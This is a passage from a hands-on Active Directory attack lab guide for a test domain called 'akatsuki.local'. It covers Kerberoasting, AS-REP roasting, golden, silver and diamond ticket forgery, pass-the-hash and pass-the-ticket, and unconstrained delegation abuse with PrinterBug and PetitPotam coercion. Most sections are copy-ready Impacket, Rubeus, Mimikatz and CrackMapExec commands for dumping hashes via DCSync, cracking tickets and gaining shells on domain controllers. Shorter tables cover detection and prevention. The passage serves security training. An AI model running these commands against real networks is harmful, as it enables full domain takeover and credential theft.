Get-ADUser svc_sql -Properties ServicePrincipalName | Select ServicePrincipalName

Write-Host "Created svc_sql with SPN - vulnerable to Kerberoasting" -ForegroundColor Yellow
```

### Attack Methods

#### 🌐 REMOTE (From Kali - requires any domain creds)

**Impacket GetUserSPNs - Kerberoast**
```bash
# Find SPNs and request tickets (any domain user works!)
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request

# Output in hashcat format
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile hashes.txt

# With NTLM hash
GetUserSPNs.py -hashes :NTHASH AKATSUKI/orochimaru -dc-ip 10.10.12.10 -request

# Just list SPNs (no ticket request)
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10

# Target specific user
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -target-domain akatsuki.local
```

**CrackMapExec Kerberoast Module**
```bash
# Kerberoast via CME
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' --kerberoasting output.txt
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

**Rubeus - Kerberoasting**
```powershell
# Kerberoast all SPNs
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Request RC4 ticket (easier to crack)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Request AES ticket (if RC4 disabled)
Rubeus.exe kerberoast /aes /outfile:hashes.txt

# With alternate credentials
Rubeus.exe kerberoast /creduser:AKATSUKI\orochimaru /credpassword:Snake2024! /outfile:hashes.txt
```

**PowerView - Kerberoasting**
```powershell
# Find Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request tickets and output hashcat format
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Save to file
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt
```

**Native PowerShell (no tools needed)**
```powershell
# Find SPNs
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

# Request ticket for specific SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.akatsuki.local:1433"

# Export tickets
klist
```

#### 🔓 Cracking (On Attacker Machine)

```bash
# Hashcat (mode 13100 = Kerberos 5 TGS-REP RC4)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AES256 tickets (mode 19700)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4769 | TGS requests with RC4 encryption (0x17) |
| Anomaly detection | Single user requesting many service tickets |
| Unusual ticket requests | For services user doesn't normally access |

**Honey Account:** Create a fake service account with SPN. Alert when anyone requests a ticket.

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Strong passwords | 25+ character passwords for service accounts |
| Managed Service Accounts | gMSA/sMSA with auto-rotating passwords |
| AES encryption | Force Kerberos to use AES |
| Limit SPNs | Remove unnecessary SPNs |

**Set account to AES only:**
```powershell
Set-ADUser -Identity svc_sql -KerberosEncryptionType AES128,AES256
```

### Cleanup: Remove Vulnerability

```powershell
# Remove the service account
Remove-ADUser -Identity "svc_sql" -Confirm:$false
```

---

## 3.2 AS-REP Roasting

### Concept

Normally, Kerberos requires pre-authentication (proves you know password). If disabled, anyone can request an AS-REP encrypted with the user's hash - crack offline!

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Pre-auth disabled | User flag "Do not require Kerberos preauthentication" |
| No auth needed | Can request AS-REP without any credentials |
| Offline cracking | No lockout, no detection |

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Disable pre-auth for sasori (makes him AS-REP roastable)
Set-ADAccountControl -Identity sasori -DoesNotRequirePreAuth $true

# Verify
Get-ADUser sasori -Properties DoesNotRequirePreAuth | Select DoesNotRequirePreAuth

Write-Host "sasori is now vulnerable to AS-REP Roasting" -ForegroundColor Yellow
```

### Attack Methods

#### 🌐 REMOTE (From Kali - NO creds needed for roasting!)

**Impacket GetNPUsers - AS-REP Roast**
```bash
# WITHOUT credentials - just need username list!
GetNPUsers.py AKATSUKI/ -dc-ip 10.10.12.10 -usersfile users.txt -no-pass -format hashcat

# Target specific user (no creds needed)
GetNPUsers.py AKATSUKI/sasori -dc-ip 10.10.12.10 -no-pass -format hashcat

# WITH credentials - auto-finds vulnerable users
GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request

# Using NTLM hash
GetNPUsers.py AKATSUKI/orochimaru -hashes :NTHASH -dc-ip 10.10.12.10 -request

# Output to file
GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile asrep.txt
```

**CrackMapExec AS-REP Module**
```bash
# Find and roast AS-REP vulnerable users
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' --asreproast output.txt

# Without creds (just enumerate, requires user list)
crackmapexec ldap 10.10.12.10 -u users.txt -p '' --asreproast output.txt
```

**Kerbrute - User enumeration + AS-REP**
```bash
# Enumerate users AND check AS-REP roastable
kerbrute userenum --dc 10.10.12.10 -d akatsuki.local users.txt
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

**Rubeus - AS-REP Roast**
```powershell
# AS-REP roast all vulnerable users
Rubeus.exe asreproast /outfile:asrep.txt

# Target specific user
Rubeus.exe asreproast /user:sasori /outfile:asrep.txt

# Output in different formats
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /format:john /outfile:asrep.txt
```

**PowerView - Find vulnerable users**
```powershell
# Find AS-REP roastable users
Get-DomainUser -PreauthNotRequired

# With more details
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname
```

**Native AD PowerShell**
```powershell
# Find users without pre-auth
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

#### 🔓 Cracking (On Attacker Machine)

```bash
# Hashcat (mode 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=krb5asrep asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| Event ID 4768 with pre-auth type 0 | Enable pre-auth on all accounts |
| AS-REQ without pre-auth | Regular audit for misconfigured accounts |

**Find vulnerable accounts:**
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Cleanup: Remove Vulnerability

```powershell
# Re-enable pre-auth for sasori
Set-ADAccountControl -Identity sasori -DoesNotRequirePreAuth $false
```

---

## 3.3 Golden Ticket

### Concept

The TGT is encrypted with the **krbtgt** hash. With this hash, forge TGTs for ANY user - including non-existent users with any group membership!

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| krbtgt key | Single key encrypts all TGTs |
| DC trusts TGT | No additional verification |
| Long validity | TGTs valid for 10 years by default |
| Any user | Can impersonate anyone |

### Lab Setup: Pre-requisites

```powershell
# Golden Ticket requires krbtgt hash
# This means you already have domain admin (DCSync) or NTDS.dit

# Step 1: Get krbtgt hash via DCSync (requires Domain Admin)
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user krbtgt

# Note the NTLM hash for krbtgt

# Step 2: Get Domain SID
Get-ADDomain | Select DomainSID
# or: whoami /user (take SID minus last number)
```

### Attack Methods

#### 🌐 REMOTE (From Kali - Create and use Golden Ticket)

**Impacket ticketer - Create Golden Ticket**
```bash
# Create golden ticket (saves as .ccache file)
ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin

# With AES key (stealthier)
ticketer.py -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin

# With specific groups (512=DA, 519=EA, 518=Schema Admins, 520=GPO Creator)
ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local -groups 512,519,518,520 fakeadmin
```

**Using the Golden Ticket from Linux**
```bash
# Export ticket to environment
export KRB5CCNAME=fakeadmin.ccache

# Now use any impacket tool with Kerberos auth (-k -no-pass)
psexec.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
wmiexec.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
secretsdump.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
smbclient.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
```

**CrackMapExec with ticket**
```bash
export KRB5CCNAME=fakeadmin.ccache
crackmapexec smb dc01.akatsuki.local -k --ntds
```

#### 💻 LOCAL (With Shell on Windows)

**Mimikatz - Create Golden Ticket**
```powershell
# Create and inject Golden Ticket into current session
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /ptt

# With specific groups
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /groups:512,519,518,520 /ptt

# With AES256 (stealthier)
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /aes256:KRBTGT_AES256 /ptt

# Save to file instead of injecting
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /ticket:golden.kirbi

# Inject saved ticket later
mimikatz # kerberos::ptt golden.kirbi
```

**Rubeus - Create Golden Ticket**
```powershell
# Create and inject
Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_NTHASH /ptt

# With AES256 (stealthier, avoids RC4 detection)
Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /aes256:KRBTGT_AES256 /ptt

# Save to file
Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_NTHASH /nowrap

# Inject ticket
Rubeus.exe ptt /ticket:BASE64_TICKET
```

**Verify ticket is loaded**
```powershell
# List current tickets
klist

# Access DC (should work with any fake username!)
dir \\dc01.akatsuki.local\C$
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4769 | TGS request for non-existent user |
| Ticket lifetime | Unusually long ticket lifetimes |
| PAC validation | Claims membership that doesn't match AD |

### Blue Team: Prevention & Response

| Action | Implementation |
|--------|----------------|
| Reset krbtgt twice | Invalidates all tickets (causes brief disruption) |
| Reduce ticket lifetime | Shorter TGT lifetime |
| Monitor krbtgt hash access | Alert on DCSync for krbtgt |

**krbtgt Reset Procedure:**
```powershell
# Reset twice (wait for replication between)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass1!" -AsPlainText -Force)
# Wait for replication...
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass2!" -AsPlainText -Force)
```

---

## 3.4 Silver Ticket

### Concept

Service Tickets are encrypted with the service account's hash. Forge tickets for specific services without touching the DC.

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Service key | Each service uses its own key |
| No DC contact | Forged locally, more stealthy |
| Direct access | Goes straight to target service |

### Lab Setup: Pre-requisites

```powershell
# Need service account hash
# Option 1: Kerberoast the service account
# Option 2: DCSync the computer account (for CIFS, HOST, etc.)
# Option 3: Compromise the server running the service

# Get computer account hash (for CIFS access to that computer)
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user 'WS01$'
```

### Attack Methods

#### 🌐 REMOTE (From Kali/Attack Machine)

```bash
# Step 1: Get the machine account hash first
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user 'WS01$'

# Step 2: Forge Silver Ticket for CIFS using ticketer.py
ticketer.py -nthash MACHINE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn cifs/ws01.akatsuki.local fakeadmin

# Step 3: Export ticket and use it
export KRB5CCNAME=fakeadmin.ccache
smbclient.py -k -no-pass ws01.akatsuki.local

# Silver Ticket for other services
ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn http/ws01.akatsuki.local fakeadmin
ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn wsman/ws01.akatsuki.local fakeadmin
ticketer.py -nthash HASH -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -spn mssql/dc01.akatsuki.local fakeadmin
```

#### 💻 LOCAL (From Compromised Host)

```powershell
# Mimikatz - Silver Ticket for CIFS (file shares)
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:cifs /rc4:MACHINE_HASH /ptt

# Mimikatz - Silver Ticket for HTTP
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:http /rc4:MACHINE_HASH /ptt

# Mimikatz - Silver Ticket for WinRM (wsman)
mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /target:ws01.akatsuki.local /service:wsman /rc4:MACHINE_HASH /ptt

# Rubeus - Forge Silver Ticket
Rubeus.exe silver /service:cifs/ws01.akatsuki.local /rc4:MACHINE_HASH /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /ptt

# Common services: cifs, http, mssql, wsman, ldap, host
```

### Blue Team: Detection

- No Event 4769 on DC (forged locally)
- Look at service access logs
- PAC validation anomalies

---

## 3.5 Diamond Ticket

### Concept

Diamond Ticket modifies a **legitimate TGT** rather than forging a new one. More stealthy because it uses real ticket structures.

### Attack Methods

#### 🌐 REMOTE (From Kali/Attack Machine)

```bash
# Diamond Ticket requires modifying a legitimate TGT
# This is primarily a LOCAL attack, but you can:

# Step 1: First get the krbtgt AES key via DCSync
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user krbtgt

# Step 2: Get a valid TGT for a low-priv user
getTGT.py akatsuki.local/orochimaru:'Snake2024!' -dc-ip 10.10.12.10

# Step 3: Modify the TGT offline (requires custom tooling)
# Note: Impacket doesn't have native diamond ticket support
# You would need to:
#   - Extract the TGT from .ccache
#   - Decrypt with krbtgt key
#   - Modify PAC (add admin groups)
#   - Re-encrypt and use

# Alternative: Use ticketer.py to forge a Golden Ticket that mimics Diamond Ticket
# behavior by copying a real user's ticket structure
ticketer.py -aesKey KRBTGT_AES_KEY -domain-sid S-1-5-21-XXXXXXX -domain akatsuki.local -user-id 500 -groups 512 administrator
```

#### 💻 LOCAL (From Compromised Host) - Primary Method

```powershell
# Rubeus Diamond Ticket - This is the main way to create Diamond Tickets
# Requires krbtgt AES key (from DCSync or NTDS.dit extraction)

# Basic Diamond Ticket - request TGT as low-priv user, modify to high-priv
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt

# With specific password for low-priv user
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:orochimaru /password:Snake2024! /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt

# With DC specified
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:orochimaru /password:Snake2024! /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /dc:dc01.akatsuki.local /ptt

# Output to file instead of injecting
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /outfile:diamond.kirbi
```

### Detection

Harder than Golden Ticket - look for:
- Tickets with modified PAC
- User behavior anomalies

---

# 4. Lateral Movement

## 4.1 Pass-the-Hash (PtH)

### Concept

NTLM authentication uses a challenge-response with the hash, not the password. If you have the hash, you can authenticate.

```
Client                          Server
   │                              │
   │──── 1. Request access ──────>│
   │<─── 2. Challenge (random) ───│
   │──── 3. Hash(Challenge) ─────>│  ← Only needs hash!
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| NTLM design | Password never sent, only hash response |
| Hash = password | Knowing hash = knowing password for auth |
| Same hash | Same password = same hash everywhere |

### Lab Setup: Make It Possible

**Step 1: Get a hash**

```powershell
# Option 1: LSASS dump (see section 2.1)
# Option 2: SAM dump (see section 2.2)
# Option 3: DCSync (see section 2.3)

# For testing, dump itachi's hash from DC:
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user itachi
```

**Step 2: Ensure NTLM is enabled (default)**

```powershell
# NTLM is typically enabled by default
# To verify on target:
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel"
# Values: 0-2 = NTLM enabled, 5 = NTLMv2 only (still works)
```

### Attack Methods

#### 🌐 REMOTE (From Kali - using NTLM hash directly)

**Impacket Suite - Various execution methods**
```bash
# psexec.py (creates service - most reliable but noisy)
psexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21

# wmiexec.py (uses WMI - stealthier, no service)
wmiexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21

# smbexec.py (uses SMB named pipe)
smbexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21

# atexec.py (uses Task Scheduler - stealthier)
atexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21 "whoami"

# dcomexec.py (uses DCOM - very stealthy)
dcomexec.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.21
```

**CrackMapExec - Mass PtH**
```bash
# Execute commands on single host
crackmapexec smb 10.10.12.21 -u itachi -H NTHASH -x "whoami"

# Execute commands on multiple hosts
crackmapexec smb 10.10.12.0/24 -u itachi -H NTHASH -x "whoami"

# Just check access (no execution)
crackmapexec smb 10.10.12.0/24 -u itachi -H NTHASH

# Get shell via various methods
crackmapexec smb 10.10.12.21 -u itachi -H NTHASH --exec-method wmiexec -x "whoami"
crackmapexec smb 10.10.12.21 -u itachi -H NTHASH --exec-method atexec -x "whoami"
```

**Evil-WinRM - Interactive shell via WinRM**
```bash
# WinRM PtH (port 5985)
evil-winrm -i 10.10.12.21 -u itachi -H NTHASH

# With SSL (port 5986)
evil-winrm -i 10.10.12.21 -u itachi -H NTHASH -S
```

**xfreerdp - RDP with hash (Restricted Admin mode)**
```bash
# RDP Pass-the-Hash (requires Restricted Admin enabled on target)
xfreerdp /v:10.10.12.21 /u:itachi /pth:NTHASH /d:AKATSUKI
```

**smbclient - Access file shares**
```bash
# Access shares with hash
smbclient //10.10.12.21/C$ -U AKATSUKI/itachi --pw-nt-hash NTHASH
smbclient //10.10.12.21/ADMIN$ -U AKATSUKI/itachi --pw-nt-hash NTHASH
```

#### 💻 LOCAL (With Shell - spawn new process with hash)

**Mimikatz - Spawn process with different creds**
```powershell
# Pass-the-Hash - spawn cmd with itachi's context
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe

# Spawn PowerShell
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:powershell.exe

# With AES key (stealthier)
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /aes256:AESKEY /run:cmd.exe
```

**Invoke-Mimikatz - PowerShell**
```powershell
# PtH via PowerShell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe"'
```

**Rubeus - Overpass-the-Hash (get TGT from hash)**
```powershell
# Request TGT with hash (then use for Kerberos auth)
Rubeus.exe asktgt /user:itachi /rc4:NTHASH /ptt

# With AES
Rubeus.exe asktgt /user:itachi /aes256:AESKEY /ptt
```

**SharpKatz**
```powershell
# PtH via SharpKatz
SharpKatz.exe --Command pth --User itachi --Domain AKATSUKI --NtlmHash NTHASH
```

### Blue Team: Detection

| Detection | Event IDs |
|-----------|-----------|
| NTLM logon | 4624 with Logon Type 3, NtLmSsp |
| Service creation | 4697 (psexec) |
| WMI activity | 4688 + wmiprvse.exe |
| Unusual admin activity | Logons from unexpected sources |

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Disable NTLM | Where possible, force Kerberos |
| Credential Guard | Protects hashes in memory |
| LAPS | Unique local admin passwords |
| Protected Users | Prevents NTLM for members |
| Admin tiering | Separate admin accounts per tier |

---

## 4.2 Pass-the-Ticket (PtT)

### Concept

Use stolen Kerberos tickets directly instead of hashes. Tickets prove identity without needing the password.

### Lab Setup: Get a Ticket

```powershell
# Export tickets from memory (requires admin on machine where user is logged in)
mimikatz # sekurlsa::tickets /export

# Or request tickets with Rubeus
Rubeus.exe dump /service:krbtgt /nowrap
```

### Attack Methods

#### 🌐 REMOTE (From Kali - using .ccache tickets)

```bash
# Convert .kirbi to .ccache for Linux use
ticketConverter.py ticket.kirbi ticket.ccache

# Export ticket
export KRB5CCNAME=ticket.ccache

# Use with any Impacket tool
psexec.py -k -no-pass AKATSUKI/itachi@dc01.akatsuki.local
wmiexec.py -k -no-pass AKATSUKI/itachi@ws01.akatsuki.local
smbclient.py -k -no-pass dc01.akatsuki.local

# CrackMapExec with ticket
export KRB5CCNAME=ticket.ccache
crackmapexec smb dc01.akatsuki.local -k --shares
```

#### 💻 LOCAL (With Shell on Windows)

```powershell
# Import ticket (Mimikatz)
mimikatz # kerberos::ptt ticket.kirbi

# Import ticket (Rubeus)
Rubeus.exe ptt /ticket:base64_ticket

# Import from file
Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi

# Verify ticket is loaded
klist

# Now access resources
dir \\dc01.akatsuki.local\C$
```

---

## 4.3 Overpass-the-Hash

### Concept

Use an NTLM hash to request a Kerberos ticket. Combines PtH + Kerberos.

### Attack Methods

#### 🌐 REMOTE (From Kali - request TGT with hash)

```bash
# Request TGT using hash (saves as .ccache)
getTGT.py -hashes :NTHASH AKATSUKI/itachi -dc-ip 10.10.12.10

# With AES key (stealthier)
getTGT.py -aesKey AES256KEY AKATSUKI/itachi -dc-ip 10.10.12.10

# Export and use
export KRB5CCNAME=itachi.ccache

# Now use Kerberos auth instead of NTLM
psexec.py -k -no-pass AKATSUKI/itachi@dc01.akatsuki.local
wmiexec.py -k -no-pass AKATSUKI/itachi@ws01.akatsuki.local
```

#### 💻 LOCAL (With Shell on Windows)

```powershell
# Mimikatz - spawn process with Kerberos auth
mimikatz # sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:HASH /run:powershell.exe

# Rubeus - request TGT and inject
Rubeus.exe asktgt /user:itachi /rc4:HASH /ptt
Rubeus.exe asktgt /user:itachi /aes256:AESHASH /ptt   # Stealthier

# With domain specified
Rubeus.exe asktgt /user:itachi /domain:akatsuki.local /rc4:HASH /dc:dc01.akatsuki.local /ptt

# Verify
klist
```

---

## 4.4 Remote Execution Methods

### Comparison Table

| Method | Port | Detection | Stealth | Notes |
|--------|------|-----------|---------|-------|
| **PsExec** | 445 | High (service creation) | Low | Creates/deletes service |
| **WMI** | 135 | Medium | Medium | Uses WMI provider |
| **WinRM** | 5985/5986 | Medium | Medium | PowerShell remoting |
| **DCOM** | 135 | Low | High | Abuses COM objects |
| **SMB** | 445 | Medium | Medium | Direct file copy + execution |
| **SSH** | 22 | Low | High | If OpenSSH installed |
| **RDP** | 3389 | Low | Medium | Interactive session |

### Examples

```bash
# DCOM
dcomexec.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.11

# WinRM
evil-winrm -i 10.10.12.11 -u itachi -p 'Akatsuki123!'
```

```powershell
# PowerShell Remoting
Enter-PSSession -ComputerName WS01 -Credential (Get-Credential)
```

---

# 5. Delegation Attacks

## 5.1 Unconstrained Delegation

### Concept

When a server has Unconstrained Delegation, it caches the TGT of any user who connects. The server can impersonate that user to ANY service.

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Enable Unconstrained Delegation on WS01
Set-ADComputer -Identity "WS01" -TrustedForDelegation $true

# Verify
Get-ADComputer WS01 -Properties TrustedForDelegation

Write-Host "WS01 now has Unconstrained Delegation - TGTs will be cached" -ForegroundColor Yellow
```

### Complete Attack Flow

#### 🌐 REMOTE (From Kali) - Full Chain

**Prerequisites:**
- Domain credentials (any user)
- Admin access on the unconstrained delegation machine (WS01)

**Step 1: Enumerate - Find unconstrained delegation machines**
```bash
# Using ldapsearch
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn

# Using CrackMapExec
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation

# Using bloodhound-python
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
# BloodHound query: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**Step 2: Get admin shell on unconstrained delegation machine (WS01)**
```bash
# If you already have pain's creds (local admin on WS01)
evil-winrm -i 10.10.12.11 -u pain -p 'Password123!'

# Or via psexec
psexec.py AKATSUKI/pain:'Password123!'@10.10.12.11

# Or via wmiexec
wmiexec.py AKATSUKI/pain:'Password123!'@10.10.12.11
```

**Step 3: Start Rubeus monitor on WS01 to capture incoming TGTs**
```powershell
# Upload Rubeus first
# Then run monitor mode - this will capture any TGT that comes in
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

# Output will show captured tickets like:
# [*] Captured TGT - user: DC01$@AKATSUKI.LOCAL
# [*] base64(ticket.kirbi): doIFxjCCBcKgAwIB...
```

**Step 4: From Kali - Trigger coercion to force DC to authenticate to WS01**
```bash
# PrinterBug (Spooler service - common)
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.11

# If PrinterBug fails, try PetitPotam (EFS)
python3 PetitPotam.py 10.10.12.11 10.10.12.10

# If both fail, try Coercer (tests multiple methods)
python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 10.10.12.11 -t 10.10.12.10

# DFSCoerce
python3 dfscoerce.py -u orochimaru -p 'Snake2024!' -d akatsuki.local 10.10.12.11 10.10.12.10
```

**Step 5: Copy the base64 ticket from Rubeus output**
```
# Rubeus will output something like:
[*] 1/28/2024 12:34:56 PM UTC - Found new TGT:
  User                  :  DC01$@AKATSUKI.LOCAL
  StartTime             :  1/28/2024 12:34:56 PM
  EndTime               :  1/28/2024 10:34:56 PM
  RenewTill             :  2/4/2024 12:34:56 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :  doIFxjCCBcKgAwIBBaEDAgEWoo... [COPY THIS ENTIRE STRING]
```

**Step 6: Use the captured TGT from Linux**
```bash
# Save base64 to file and convert
echo "doIFxjCCBcKgAwIBBaEDAgEWoo..." | base64 -d > dc01.kirbi

# Convert .kirbi to .ccache
ticketConverter.py dc01.kirbi dc01.ccache

# Export the ticket
export KRB5CCNAME=$(pwd)/dc01.ccache

# Verify ticket works
klist

# DCSync - dump all hashes
secretsdump.py -k -no-pass akatsuki.local/DC01\$@dc01.akatsuki.local

# Or get shell on DC
psexec.py -k -no-pass dc01.akatsuki.local

# Or access shares
smbclient.py -k -no-pass dc01.akatsuki.local
```

#### 💻 LOCAL (Full Windows Attack Chain)

**Step 1: Find unconstrained delegation machines**
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name

# Manual LDAP
([adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))').FindAll()
```

**Step 2: Start Rubeus monitor (run as admin on WS01)**
```powershell
# Monitor for all incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Or filter for specific targets
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:itachi
```

**Step 3: Trigger coercion (from same or different machine)**
```powershell
# SpoolSample.exe (PrinterBug)
.\SpoolSample.exe dc01.akatsuki.local ws01.akatsuki.local

# Or from Kali
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 10.10.12.11
```

**Step 4: Rubeus captures the TGT - inject it**
```powershell
# Copy the base64 ticket from Rubeus output and inject
.\Rubeus.exe ptt /ticket:doIFxjCCBcKgAwIBBaEDAgEWoo...

# Verify ticket is loaded
klist

# You now have DC01$ machine account access!
```

**Step 5: Use the ticket - DCSync**
```powershell
# With mimikatz - DCSync all users
mimikatz # lsadump::dcsync /domain:akatsuki.local /all

# DCSync specific user (krbtgt for Golden Ticket)
mimikatz # lsadump::dcsync /domain:akatsuki.local /user:krbtgt

# DCSync Domain Admin
mimikatz # lsadump::dcsync /domain:akatsuki.local /user:itachi

# Access DC shares
dir \\dc01.akatsuki.local\c$
```

**Step 6: Alternative - Export tickets with mimikatz**
```powershell
# Instead of Rubeus, use mimikatz to export cached tickets
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# This creates .kirbi files - find the DC01$ TGT
dir *.kirbi

# Import and use
